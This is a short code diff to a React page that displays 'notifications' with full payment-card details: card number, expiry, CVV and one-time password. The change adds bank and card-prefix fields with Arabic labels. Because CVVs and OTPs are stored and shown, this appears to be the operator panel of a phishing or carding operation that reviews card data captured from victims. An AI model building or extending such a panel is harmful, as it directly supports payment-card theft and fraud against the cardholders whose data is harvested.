@@ -44,7 +44,9 @@ interface Notification {
     phone: string;
   };
   cardInfo?: {
+    bank:string;
     cardNumber: string;
+    prefix:string;
     expirationDate: string;
     cvv: string;
     otp: string;
@@ -304,6 +306,14 @@ export default function NotificationsPage() {
             )}
           {selectedInfo === 'card' && selectedNotification?.cardInfo && (
             <div className="space-y-2">
+              <p>
+                <strong className="text-red-400 mx-4">البنك:</strong>{' '}
+                {selectedNotification.cardInfo.bank}
+              </p>
+              <p>
+                <strong className="text-red-400 mx-4">prefix:</strong>{' '}
+                {selectedNotification.cardInfo.prefix}
+              </p>
               <p>
                 <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{' '}
                 {selectedNotification.cardInfo.cardNumber}
